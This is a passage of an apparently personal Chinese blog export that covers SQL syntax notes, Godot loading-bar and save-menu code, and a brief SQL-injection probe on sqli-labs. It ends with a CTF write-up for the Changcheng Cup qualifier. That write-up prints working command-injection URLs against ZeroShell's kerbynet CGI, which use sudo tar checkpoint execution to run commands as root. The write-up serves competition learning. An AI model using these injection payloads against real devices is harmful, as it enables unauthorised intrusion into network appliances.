<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> table_name <span class="keyword">SET</span> column1 <span class="operator">=</span> value1 <span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br></pre></td></tr></table></figure>

<p>更新 <code>table_name </code>中的 <code>column1</code> 设置为 <code>value1</code> 在满足 <code>condition</code> 这个条件时会更新。</p>
<hr>
<p><code>MIN</code> 用于返回某列中的最小值</p>
<p>Example:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">MIN</span>(column_name) <span class="keyword">FROM</span> <span class="keyword">table</span>;</span><br></pre></td></tr></table></figure>

<p>选择 <code>column_name </code>列中的最小值</p>
<hr>
<p><code>COUNT</code>：用来统计满足条件的行数。</p>
<p>Example:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(column_name) <span class="keyword">FROM</span> table_name <span class="keyword">WHERE</span> <span class="keyword">condition</span>; </span><br></pre></td></tr></table></figure>

<p>返回 <code>table_name </code>中 <code>condition</code> 条件下  <code>column_name </code>列的行数 </p>
<hr>
<p><code>WHERE</code> 用于指定查询条件，过滤符合条件的数据。</p>
<p>Example:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">WHERE</span> <span class="keyword">column</span> <span class="operator">=</span> <span class="keyword">value</span>;</span><br></pre></td></tr></table></figure>

<p>选择所有表中<code>column</code> 列值为<code>value</code>的数据。</p>
<hr>
<p><code>AVG</code>：返回某列的平均值</p>
<p>Example:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">AVG</span>(column_name) <span class="keyword">FROM</span> <span class="keyword">table</span>;</span><br></pre></td></tr></table></figure>

<p>返回表中 <code>column_name</code> 列的平均值。</p>
<hr>
<p><code>SUM</code>：用于返回某列的总和。</p>
<p>Example：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUM</span>(column_name) <span class="keyword">FROM</span> <span class="keyword">table</span>;</span><br></pre></td></tr></table></figure>

<p>返回<code>column_name</code> 列的合。</p>
<hr>
<p><code>IN</code>： 用于在<code>WHERE</code> 自居中检查某列值是否在指定的多个值中。</p>
<p>Example:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">WHERE</span> <span class="keyword">column</span> <span class="keyword">IN</span> (value1, value2, value3)</span><br></pre></td></tr></table></figure>

<p>选择<code>table </code> 表中的<code>column</code>列检查列中是否含有<code>(value1, value2, value3)</code>中的值。</p>
<hr>
<p><code>BETWEEN</code> 用于在 <code>WHERE</code> 中指定一个范围（开始 — 结束）</p>
<p>Example:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">WHERE</span> <span class="keyword">column</span> <span class="keyword">BETWEEN</span> value1 <span class="keyword">AND</span> value2;</span><br></pre></td></tr></table></figure>

<p>选择 <code>table</code> 表中 <code>column</code> 列的范围是<code>value1</code> 到 <code>value2</code></p>
<p>ps: <code>value1 </code>和 <code>value2</code> 为边界</p>
<hr>
<p><code>AS</code>: 用于为列或表指定别名</p>
<p>Example：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">AS</span> alias_name <span class="keyword">FROM</span> <span class="keyword">table</span>;</span><br></pre></td></tr></table></figure>

<p>从数据库的<code>table</code>表中查询 <code>column_name</code> 列的数据，并为此列设置一个别名为<code>alias_name</code> </p>
<hr>
<p><code>JOIN</code> 用于同时查询多张表，通过在不同表之间建立关系，将他们的数据合并到一个结果中。</p>
<p><code>ON</code>: 用于在<code>JOIN</code>语句中指定连接条件</p>
<p>Example:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> columns</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> table2</span><br><span class="line"><span class="keyword">ON</span> table1.column_name <span class="operator">=</span> table2.collumn_name</span><br></pre></td></tr></table></figure>

<p>查询列 <code>columns</code> 在<code>table1</code>和<code>table2</code>表中连接  两个表 符合条件<code>table1.column_name = table2.column_name;</code> 则返回数据。</p>
<hr>
<p><code>INNER</code> 内连接（只返回两个表中匹配的记录）</p>
<p>Example:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table1 <span class="keyword">INNER</span> <span class="keyword">JOIN</span> table2 <span class="keyword">ON</span> table1.id <span class="operator">=</span> table2.id;</span><br></pre></td></tr></table></figure>

<p>选择表<code>table1</code> 内联 <code>table2</code> 满足<code>table2 ON table1.id = table2.id;</code> 返回相关的所有列数据</p>
<hr>
<p><code>RIGHT</code> 返回右边表中的所有记录以及左边表中能匹配右边记录的行。</p>
<p>Example：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table1 <span class="keyword">RIGHT</span> <span class="keyword">JOIN</span> table2 <span class="keyword">ON</span> table1.id <span class="operator">=</span> table2.id;</span><br></pre></td></tr></table></figure>

<p>连接 <code>table1</code> 和 <code>table2</code> 返回 <code>table2</code>的所有数据和<code>table1.id = table2.id;</code>相匹配的左边的数据。</p>
<hr>
<p><code>ORDER BY</code> 子句用于对查询结果进行排序。</p>
<p><code>DESC</code>用于在<code>DRDER BY</code> 字句中指定降序排序。</p>
<p><code>ASC</code>用于在<code>DRDER BY</code> 字句中指定升序排序。</p>
<ul>
<li><p>可以按照一个或多个列对结果进行升序<code>ASC</code> 或降序<code>DESC</code></p>
</li>
<li><p><strong>升序排序</strong>通常是数字从小到大，字符串从字母 A 到 Z</p>
<ul>
<li>降序反之</li>
</ul>
</li>
</ul>
<p>Example:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">column</span> <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>

<p>获取 <code>table</code> 中的所有列并根据<code>column</code>的值 按照 <code>DESC</code> 排序。</p>
<hr>
<p><code>DROP</code> 用于删除数据库中的对象（表、视图、数据库）等。</p>
<p>Example:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> table_name;</span><br></pre></td></tr></table></figure>

<p>删除了表名为<code>table_name</code> 的表。</p>
<hr>
<p><code>AKTER</code> ：用于修改表的结构（添加、删除、…）</p>
<p>Example：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">ADD</span> column_name datatype;</span><br></pre></td></tr></table></figure>

<p>修改<code>table_name</code>表的列，添加了一个<code>datatype</code>类型名为<code>column_name</code>的列。</p>
]]></content>
      <tags>
        <tag>SQL</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>2024-11-24-GDProgressBar</title>
    <url>/2024/11/24/2024-11-24-GDProgressBar/</url>
    <content><![CDATA[<h3 id="实现独立渲染的加载进度条界面（已弃用）"><a href="#实现独立渲染的加载进度条界面（已弃用）" class="headerlink" title="实现独立渲染的加载进度条界面（已弃用）"></a>实现独立渲染的加载进度条界面（已弃用）</h3><p>基本步骤</p>
<ol>
<li><p>创建 <code>CanvasLayer</code>作为独立渲染节点</p>
</li>
<li><p>使用Godot自带的<code>ProgressBar</code> 作为子节点</p>
<ol>
<li>修改颜色</li>
<li>添加<code>Value</code>类</li>
</ol>
</li>
<li><p>添加脚本</p>
</li>
</ol>
<p><code>GDScript</code>写法：</p>
<p>进度条的脚本</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">extends Control</span><br><span class="line"><span class="comment">// 获取一下进度条</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义读取的路径</span></span><br><span class="line"><span class="keyword">var</span> loading_path = <span class="string">&quot;&quot;</span>    </span><br><span class="line">@onready <span class="keyword">var</span> progressBar:ProgressBar = $ProgressBar</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 定义进度的数组和值</span></span><br><span class="line"><span class="keyword">var</span> progress = []</span><br><span class="line"><span class="keyword">var</span> scene_load_status = <span class="number">0</span></span><br><span class="line">fun _ready():</span><br><span class="line">	<span class="comment">// 定义一个最大值</span></span><br><span class="line">	progressBar.max_value</span><br><span class="line">    <span class="comment">// 传入下一个场景的路径</span></span><br><span class="line">    ResourceLoader.load_threaded_request(SceneChanger.loading_path)</span><br><span class="line">    pass</span><br><span class="line">fun _process():</span><br><span class="line">	scene_load_status = ResourceLoader.load_threaded_get_status(ScenChanger.loading_path)</span><br><span class="line">    <span class="comment">// 更改进度条</span></span><br><span class="line">    progressBar.<span class="keyword">value</span> = progress[<span class="number">0</span>] * <span class="number">100</span></span><br><span class="line">        <span class="comment">// 判断是否加载完毕</span></span><br><span class="line">    <span class="keyword">if</span> scene_load_status = ResourceLoader.THEAD_LOAD_LOADED:</span><br><span class="line">		<span class="comment">// 关闭加载函数</span></span><br><span class="line">		set_proess(<span class="literal">false</span>)</span><br><span class="line">        <span class="comment">// 交互优化 停顿0.5s</span></span><br><span class="line">        <span class="keyword">await</span> get_tree().create_timer(<span class="number">0.5</span>).timeout</span><br><span class="line">        SceneChanger.change_scene(ReosurceLoader.load_threaded_get(SceneChanger.loading_path)) </span><br><span class="line">    pass</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>场景的定义</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">extends CanvasLayer</span><br><span class="line"><span class="keyword">var</span> loading_path = <span class="string">&quot;&quot;</span></span><br><span class="line">@onready <span class="keyword">var</span> animation:AnimationPlaer = $AnimationPlayer</span><br><span class="line">func _ready():</span><br><span class="line">	self.hide()</span><br><span class="line">    pass</span><br><span class="line">func _process(delta):</span><br><span class="line">	<span class="function">pass</span></span><br><span class="line"><span class="function">func <span class="title">change_scene</span>(<span class="params">path, isLoading:<span class="built_in">bool</span> = <span class="literal">false</span></span>):</span></span><br><span class="line"><span class="function">	self.<span class="title">show</span>()</span></span><br><span class="line"><span class="function">    self.<span class="title">set_layer</span>(<span class="params"><span class="number">999</span></span>)</span></span><br><span class="line"><span class="function">    animation.<span class="title">play</span>(<span class="params"><span class="string">&quot;changer&quot;</span></span>)</span></span><br><span class="line"><span class="function">    <span class="keyword">await</span> animation.animation_finished</span></span><br><span class="line"><span class="function">        <span class="keyword">if</span> <span class="keyword">is</span> Loading:</span></span><br><span class="line"><span class="function">			loading_path</span> = path</span><br><span class="line">            <span class="comment">// 那就执行loading页面</span></span><br><span class="line">            get_tree().change_scene_to_file(<span class="string">&quot;res://page_loading/page_loading.tscn&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">			<span class="comment">// 资源加载完资源有一个自己的类型</span></span><br><span class="line">			<span class="function"><span class="keyword">if</span> <span class="title">typeof</span>(<span class="params">path</span>)</span> == TYPE_STRING:</span><br><span class="line">				</span><br><span class="line">				get_tree().change_scene_to_file(path)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">				get_tree().change_scene_to_packed(path)</span><br><span class="line">    get_tree().change_scene_to_file(path)</span><br><span class="line">    animation.play_backwards(<span class="string">&quot;changer&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> animation.animation_finished</span><br><span class="line">    self.set_layer(<span class="number">-1</span>)</span><br><span class="line">    self.hide()</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>

<p>调用时</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">SceneChanger.change_scene(<span class="string">&quot;res://scene2.tscn&quot;</span>, <span class="literal">true</span>)</span><br></pre></td></tr></table></figure>

<p><code>C#</code> 写法</p>
<hr>
<p>主要思路就是，先检查是否加载，若未加载，则运行进度条，加载后出现</p>
<p>定义方法，接收场景资源和进度条资源</p>
<p>进度条根据场景资源的加载速度来加载</p>
<h2 id="使用-ResourceLoader¶"><a href="#使用-ResourceLoader¶" class="headerlink" title="使用 ResourceLoader¶"></a>使用 ResourceLoader<a href="https://docs.godotengine.org/zh-cn/4.x/tutorials/io/background_loading.html#using-resourceloader">¶</a></h2><p>通常使用 <a href="https://docs.godotengine.org/zh-cn/4.x/classes/class_resourceloader.html#class-resourceloader-method-load-threaded-request">ResourceLoader.load_threaded_request</a> 将资源加载请求加入队列，其他线程会在后台进行加载。</p>
<p>你可以使用 <a href="https://docs.godotengine.org/zh-cn/4.x/classes/class_resourceloader.html#class-resourceloader-method-load-threaded-get-status">ResourceLoader.load_threaded_get_status</a> 检查状态。给 progress 传一个数组变量就可以获取进度，返回时该数组中包含一个元素，表示百分比。</p>
<p>最后调用 <a href="https://docs.godotengine.org/zh-cn/4.x/classes/class_resourceloader.html#class-resourceloader-method-load-threaded-get">ResourceLoader.load_threaded_get</a> 即可获取加载到的资源。</p>
<p>传入需要加载的场景的路径，让场景都在进度条的类下进行加载。</p>
<p>加载完毕后关闭进度条类。</p>
<p>实例化场景类。</p>
<hr>
<p>迫真写法</p>
<p>我这个无敌了上面麻烦死了！！！</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">ResourceLoader.LoadThreadedRequest(resourcePath, <span class="string">&quot;PackedScene&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">ResourceLoader.ThreadLoadStatus loadState = ResourceLoader.LoadThreadedGetStatus(resourcePath, progressArray);</span><br><span class="line">            </span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>C#</tag>
        <tag>godot</tag>
      </tags>
  </entry>
  <entry>
    <title>2024-11-25-GodotArchivres</title>
    <url>/2024/11/25/2024-11-25-GodotArchivres/</url>
    <content><![CDATA[<h3 id="多存档页实现"><a href="#多存档页实现" class="headerlink" title="多存档页实现"></a>多存档页实现</h3><p>思路</p>
<p>数组啊，数组生成页面</p>
<p>弄一个列表</p>
<p>矩阵</p>
]]></content>
  </entry>
  <entry>
    <title>2024-11-26-GodotSaveDemo</title>
    <url>/2024/11/26/2024-11-26-GodotDemo/</url>
    <content><![CDATA[<h3 id="动态存档Demo示例"><a href="#动态存档Demo示例" class="headerlink" title="动态存档Demo示例"></a>动态存档Demo示例</h3><p>没什么用留档纪念自己的代码</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> Godot;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">partial</span> <span class="keyword">class</span> <span class="title">Archives</span> : <span class="title">Node2D</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">private</span> List&lt;<span class="built_in">string</span>&gt; SaveFiles;</span><br><span class="line">	<span class="keyword">private</span> <span class="built_in">int</span> SaveFileIndex = <span class="number">25</span>;</span><br><span class="line">    <span class="comment">// Called when the node enters the scene tree for the first time.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> _Ready()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 创建一个 GridContainer ScrollContainer</span></span><br><span class="line">        <span class="comment">// 创建 ScrollContainer 实例</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> HFContainer = <span class="keyword">new</span> HFlowContainer</span><br><span class="line">        &#123;</span><br><span class="line">            Name = <span class="string">&quot;HFlowContainer&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        HFContainer.Size = <span class="keyword">new</span> Vector2(<span class="number">1600</span>, <span class="number">800</span>);</span><br><span class="line">        HFContainer.SetPosition(<span class="keyword">new</span> Vector2(<span class="number">130</span>, <span class="number">180</span>)); </span><br><span class="line">        <span class="comment">// 设置外间距</span></span><br><span class="line">        <span class="comment">// gridContainer</span></span><br><span class="line">        AddChild(HFContainer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建按钮</span></span><br><span class="line">        SaveFiles = GetSaveFiles().Take(SaveFileIndex).ToList();</span><br><span class="line">		<span class="comment">// 要根据当前状态选择按钮数量哦</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 初始25</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">25</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> ButtonName = <span class="string">&quot;空存档&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; SaveFiles.Count())&#123;</span><br><span class="line">                ButtonName = SaveFiles[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> button = <span class="keyword">new</span> Button</span><br><span class="line">            &#123;</span><br><span class="line">                Text = ButtonName</span><br><span class="line">            &#125;;</span><br><span class="line">            button.SetCustomMinimumSize(<span class="keyword">new</span> Vector2(<span class="number">300</span>, <span class="number">170</span>));</span><br><span class="line">            HFContainer.AddChild(button); <span class="comment">// 添加按钮到 GridContainer</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// 动态渲染思路</span></span><br><span class="line">	<span class="comment">// 每次渲染25个</span></span><br><span class="line">	<span class="comment">// 进度条长度被渲染数量影响</span></span><br><span class="line">	<span class="comment">// 进度条value被改变到30以下渲染更多个</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ChangeScrollBarLong</span>()</span>&#123;</span><br><span class="line">		<span class="comment">// var scrollContainer = GetNode&lt;HScrollBar&gt;(&quot;HScrollBar&quot;);</span></span><br><span class="line">		<span class="comment">// scrollContainer.Size = new Vector2(100, 100);</span></span><br><span class="line">		<span class="keyword">var</span> scrollContainer = GetNode&lt;HScrollBar&gt;(<span class="string">&quot;HScrollBar&quot;</span>);</span><br><span class="line">		scrollContainer.MaxValue += <span class="number">50</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">async</span> <span class="keyword">void</span> <span class="title">SaveScrollBarChange</span>(<span class="params"><span class="built_in">float</span> <span class="keyword">value</span></span>)</span>&#123;</span><br><span class="line">		<span class="comment">// 原来可以传参执行</span></span><br><span class="line">        <span class="comment">// var scrollContainer = GetNode&lt;HScrollBar&gt;(&quot;HScrollBar&quot;);</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// GD.Print(&quot;Horizontal Scroll Value: &quot; + scrollContainer.Value);</span></span><br><span class="line">        <span class="keyword">var</span> HFlowContainer = GetNode&lt;HFlowContainer&gt;(<span class="string">&quot;HFlowContainer&quot;</span>);</span><br><span class="line">		HFlowContainer.SetPosition(<span class="keyword">new</span> Vector2(<span class="number">130</span>, <span class="number">180</span>-<span class="keyword">value</span>*<span class="number">20</span>));</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 级别范围判定</span></span><br><span class="line">		<span class="comment">// 两个值</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 每当滚动条的值增加10时，增加一次列表内容</span></span><br><span class="line">		<span class="comment">// 硬编码级别 或者 算法</span></span><br><span class="line">		<span class="comment">// 设置一个范围</span></span><br><span class="line">		<span class="comment">// 检查内容级别 </span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 思考规律 20~30~40~50~60~70~80~90~100</span></span><br><span class="line">		<span class="comment">// 每个内容级别内容不同</span></span><br><span class="line">		<span class="comment">// 那么，逻辑就是，多减少增</span></span><br><span class="line">		<span class="built_in">int</span> level = (<span class="built_in">int</span>)(<span class="keyword">value</span> / <span class="number">10</span>);</span><br><span class="line">		<span class="built_in">int</span> NowLevel = SaveFileIndex / <span class="number">10</span>;</span><br><span class="line">		GD.Print(level);</span><br><span class="line">		GD.Print(NowLevel);</span><br><span class="line"></span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (level &gt; NowLevel) </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// 增加少就增加一次捏</span></span><br><span class="line">			SaveFileIndex+=<span class="number">5</span>;</span><br><span class="line">			<span class="keyword">for</span> (<span class="built_in">int</span> i = SaveFileIndex; i &lt; SaveFileIndex+<span class="number">5</span>; i++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">await</span> ToSignal(GetTree().CreateTimer(<span class="number">0.3f</span>), <span class="string">&quot;timeout&quot;</span>);</span><br><span class="line"></span><br><span class="line">				<span class="built_in">string</span> ButtonName = <span class="string">&quot;空存档&quot;</span>;</span><br><span class="line">				<span class="keyword">if</span> (i &lt; SaveFiles.Count())&#123;</span><br><span class="line">					ButtonName = SaveFiles[i];</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">var</span> button = <span class="keyword">new</span> Button</span><br><span class="line">				&#123;</span><br><span class="line">					Text = ButtonName</span><br><span class="line">				&#125;;</span><br><span class="line">				button.SetCustomMinimumSize(<span class="keyword">new</span> Vector2(<span class="number">300</span>, <span class="number">170</span>));</span><br><span class="line">				HFlowContainer.AddChild(button); <span class="comment">// 添加按钮到 GridContainer</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 考虑 MaxValue 的等级是否和 level 一致</span></span><br><span class="line">		<span class="comment">// if (level &gt; 8) // scrollContainer.MaxValue</span></span><br><span class="line">		<span class="comment">// &#123;</span></span><br><span class="line">		<span class="comment">// 	// 调用事件或函数处理逻辑</span></span><br><span class="line">		<span class="comment">// 	ChangeScrollBarLong();</span></span><br><span class="line">		<span class="comment">// &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Called every frame. &#x27;delta&#x27; is the elapsed time since the previous frame.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> _Process(<span class="built_in">double</span> delta)</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> List&lt;<span class="built_in">string</span>&gt; <span class="title">GetSaveFiles</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 打开 user:// 目录</span></span><br><span class="line">        <span class="keyword">using</span> <span class="keyword">var</span> dir = DirAccess.Open(<span class="string">&quot;user://save&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取文件列表</span></span><br><span class="line">        <span class="built_in">string</span>[] files = dir.GetFiles();</span><br><span class="line">        List&lt;<span class="built_in">string</span>&gt; fileList = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt;(files);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 删除不以 &quot;.res&quot; 结尾的文件</span></span><br><span class="line">        fileList.RemoveAll(file =&gt; !file.EndsWith(<span class="string">&quot;.res&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> fileList;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>C#</tag>
        <tag>godot</tag>
      </tags>
  </entry>
  <entry>
    <title>2024-12-2-SQL注入基操</title>
    <url>/2024/12/02/2024-12-2-SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%93%8D/</url>
    <content><![CDATA[<h3 id="SQL-注入基操"><a href="#SQL-注入基操" class="headerlink" title="SQL 注入基操"></a>SQL 注入基操</h3><p>基本判断</p>
<p>sqlLabs 第一题</p>
<p><code>http://127.0.0.1/Less-1/?id=1&#39;</code></p>
<p>回显</p>
<p><code> You have an error in your SQL syntax; check the  manual that corresponds to your MySQL server version for the right  syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code></p>
<p>翻译</p>
<p><code>您的SQL语法有错误；查看与MySQL服务器版本对应的手册，了解第1行“1”“LIMIT 0,1”附近使用的正确语法</code>
这时候已经很明显了</p>
<p>有报错回显的注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; at line 1 </span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>SQL</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>2024-12-17 长城杯初赛WP</title>
    <url>/2024/12/17/2024-12-17-%E9%95%BF%E5%9F%8E%E6%9D%AFWP/</url>
    <content><![CDATA[<h2 id="威胁检测与网络流量分析"><a href="#威胁检测与网络流量分析" class="headerlink" title="威胁检测与网络流量分析"></a>威胁检测与网络流量分析</h2><h3 id="zeroshell-1"><a href="#zeroshell-1" class="headerlink" title="zeroshell_1"></a>zeroshell_1</h3><p>题目内容：</p>
<p>小路是一名实习生，接替公司前任网管的工作，一天发现公司网络出口出现了异常的通信，现需要通过回溯出口流量对异常点位(防火墙)进行定位，并确定异常的设备。然后进行深度取证检查（需要获取root权限）。现在需要你从网络攻击数据包中找出漏洞攻击的会话，分析会话编写exp或数据包重放获取防火墙设备管理员权限，查找防火墙设备上安装的木马，然后分析木马外联地址和通信密钥以及木马启动项位置。</p>
<p>1.从数据包中找出攻击者利用漏洞开展攻击的会话（攻击者执行了一条命令），写出该会话中设置的flag, 结果提交形式：flag{xxxxxxxxx}</p>
<p>（本题附件见于提前下载的加密附件2e9c01da1d333cb8840968689ed3bc57.7z，解压密码为11b0526b-9cfb-4ac4-8a75-10ad9097b7ce ）</p>
<ol>
<li>解压附件</li>
</ol>
<p>解压后是一个vmk的虚拟机内容和一个流量包，其他文件夹是空的</p>
<p>先运行vmk ps: 需要17以上版本，而我准备的vm是16版本的，所以花了些时间重装</p>
<p>把虚拟机跑起来</p>
<p>题目已提示</p>
<p><code>分析会话编写exp或数据包重放获取防火墙设备管理员权限</code></p>
<p>多半是数据包重放攻击</p>
<p>整理好思路开始查看</p>
<p>ps: 太累了不放图了</p>
<p>wireshark过滤内容</p>
<p>http </p>
<p>然后搜索字符串 搜那个登录的 action键的值</p>
<p>搜到了账号密码 admin qwe!@..</p>
<p>试了很多次无法登录</p>
<p>这是个误导人的信息</p>
<p>后面对cgi接口进行测试</p>
<p>在http请求数据包中找到了一串base64</p>
<p>这个既是答案也是下一题的线索</p>
<hr>
<h3 id="zeroshell-2"><a href="#zeroshell-2" class="headerlink" title="zeroshell_2"></a>zeroshell_2</h3><p>2.通过漏洞利用获取设备控制权限，然后查找设备上的flag文件，提取flag文件内容</p>
<p>看到这个就该想到webshell了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">61.139.2.100//cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=<span class="string">&#x27;%0A/etc/sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=&#x27;</span>find / -name “flag”<span class="string">&#x27;%0A&#x27;</span>%20 HTTP/1.1</span><br></pre></td></tr></table></figure>

<p>经过测试发现传参漏洞</p>
<p>先经过find命令找到flag文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">61.139.2.100//cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=<span class="string">&#x27;%0A/etc/sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=&#x27;</span>find / -name “flag”<span class="string">&#x27;%0A&#x27;</span>%20 HTTP/1.1</span><br></pre></td></tr></table></figure>

<p>直接cat 拿到flag</p>
<hr>
<h3 id="zeroshell-3"><a href="#zeroshell-3" class="headerlink" title="zeroshell_3"></a>zeroshell_3</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">61.139.2.100//cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=<span class="string">&#x27;%0A/etc/sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=&#x27;</span>netstat -ano<span class="string">&#x27;%0A&#x27;</span>%20 HTTP/1.1</span><br></pre></td></tr></table></figure>

<p>找到IP就行了</p>
<p>没截图别看了</p>
<h3 id="zeroshell-5"><a href="#zeroshell-5" class="headerlink" title="zeroshell_5"></a>zeroshell_5</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://61.139.2.100//cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=<span class="built_in">exec</span>=%27cat%20/DB/_DB.001/.nginx %27%0A%27%20%20HTTP/1.1</span><br></pre></td></tr></table></figure>

<p>应该没打错吧</p>
<p>把木马文件内容提取出来</p>
<p>hxd打开查看字段找到密码311223344qweasdzxc</p>
